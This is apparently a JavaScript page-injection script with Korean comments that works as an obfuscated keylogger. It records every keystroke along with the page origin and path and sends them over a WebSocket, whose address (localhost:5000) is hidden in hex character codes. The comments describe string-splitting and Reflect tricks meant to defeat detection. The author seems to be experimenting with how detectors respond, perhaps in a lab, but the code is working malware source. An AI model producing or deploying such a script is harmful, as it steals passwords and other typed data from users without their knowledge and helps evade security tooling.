(() => {
  const _g = (function() { return this; })();//난독화를 돕기 위한 this 객체입니다.
  const _d = _g["docu" + "ment"];//난독화를 돕기위한 document입니다.
  const _listen = _g["Ref" + "lect"]["get"](_d, "addEven" + "tListen" + "er")["bind"](_d);//이벤트리스너 대신 사용할 녀석입니다.
  const _k_Ev = "ke" + "yd" + "own";//키로거때 대신 쓸 변수

  console.log("[injected] loaded from :4000");

  //그냥 문구 6초동안 뜨게 만든 div태그 입니다.
  const badge = document.createElement("div");
  badge.textContent = "Injected script (telemetry on)";
  badge.style.cssText = `
    position: fixed;
    left: 16px;
    bottom: 16px;
    z-index: 999999;
    padding: 10px 12px;
    border-radius: 10px;
    background: #111;
    color: #fff;
    font-size: 13px;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
  `;
  document.documentElement.appendChild(badge);

  //세션생성
  const sessionId = (crypto.randomUUID && crypto.randomUUID()) || String(Math.random()).slice(2);//통신하기 전에 세션 만들기

  //웹소켓 생성(난독화)
  //const ws = new WebSocket("ws://localhost:5000"); 원래는 이거였음
  //아스키 코드를 16진수로 표현하여 더 난해하게 만들기
  const _wsAddrParts = [0x77, 0x73, 0x3a, 0x2f, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x3a, 0x35, 0x30, 0x30, 0x30];
  const _wsUrl = _g["Str" + "ing"]["fromCha" + "rCode"](..._wsAddrParts);

  // 3. WebSocket 객체 생성 (난독화)
  const _WS_NAME = "Web" + "Soc" + "ket";
  const _WS_CLASS = _g[_WS_NAME];
  const ws = _g["Ref" + "lect"]["cons" + "truct"](_WS_CLASS, [_wsUrl]);//그냥 괜히 new 말고 reflect랑 construct 사용하기

  //safesend대신 간접호출용으로 만든 함수(키로거에 난독화에 사용예정)
  const _sender = (data) => {
    const _sendStr = "se" + "nd";
    if (ws["ready" + "State"] === 1) {
      ws[_sendStr](_g["JS" + "ON"]["stri" + "ngify"](data));
    }
  };

  //일단 얘는 그냥 뒀습니다. 뭔가 키로거랑 따로 따로 했을때 인식 차이가 궁금해서
  ws.addEventListener("open", () => {
    _sender({
      eventType: "INJECTED_LOADED",
      ts: _g["Da" + "te"]["no" + "w"](), // 이 부분도 난독화하면 더 좋겠죠?
      sessionId,
      pageOrigin: _g["loca" + "tion"]["ori" + "gin"],
      pagePath: _g["loca" + "tion"]["path" + "name"]
    });
  });

    //키로거(난독화)
    _listen(_k_Ev, (_event) => {
    const _loc = _g["loca" + "tion"];
    
    // 유출할 데이터 객체(Payload) 조립
    const _payload = {};
    _payload["ty" + "pe"] = "KE" + "Y_LOG";
    _payload["t" + "s"] = _g["Da" + "te"]["no" + "w"]();
    _payload["sid"] = sessionId;
    _payload["val"] = _event["k" + "ey"]; // e.key 대신 _event["key"]
    _payload["ori"] = _loc["ori" + "gin"];
    _payload["pth"] = _loc["path" + "name"];

    _sender(_payload);
    });


  ws.addEventListener("error", () => console.log("[injected] ws error"));//에러 알림
  ws.addEventListener("close", () => console.log("[injected] ws closed"));//종료 알림

  setTimeout(() => badge.remove(), 6000);//6초 뒤에 자동으로 꺼짐
})();
